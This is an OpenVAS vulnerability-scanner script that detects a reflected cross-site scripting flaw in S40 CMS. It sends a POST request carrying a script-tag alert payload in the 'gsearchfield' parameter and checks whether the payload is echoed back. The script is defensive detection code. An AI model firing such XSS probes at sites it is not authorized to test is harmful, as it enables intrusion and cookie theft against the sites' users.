###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_s40_cms_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# S40 Content Management System (CMS) Cross-Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site.
  This may allow an attacker to steal cookie-based authentications and launch
  further attacks.
  Impact Level: Application";
tag_affected = "S40 Content Management System (CMS) v0.4.2 beta and prior.";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed via
  the 'gsearchfield' parameter in 'index.php' is not properly verified before
  it is returned to the user.";
tag_solution = "No solution or patch is available as of 1st August, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://s40.biz/";
tag_summary = "This host is running S40 Content Management System (CMS) and is
  prone to cross site scripting vulnerability.";

if(description)
{
  script_id(801961);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("S40 Content Management System (CMS) Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=209");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_S40_CMS_XSS.txt");

  script_description(desc);
  script_summary("Check if S40 Content Management System (CMS) is prone to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!get_port_state(port)) {
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir(make_list("/cms", "", "/s40", "/s40cms", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get (item: string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("Powered by S40 CMS" >< res)
  {
    ## Construct the Attack Request
    postData = "gsearchfield=<script>alert('OpenVAS-XSS-TEST')</script>" +
               "&gs=true&gsearchsubmit=Search";

    ## Construct XSS post attack request
    req = string("POST ", dir, "/index.php HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n",
                 "User-Agent: S40 XSS TEST\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n\r\n", postData);

    ## Try XSS Attack
    res = http_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
     ("'<script>alert('OpenVAS-XSS-TEST')</script>" >< res))
    {
      security_warning(port);
      exit(0);
    }
  }
}
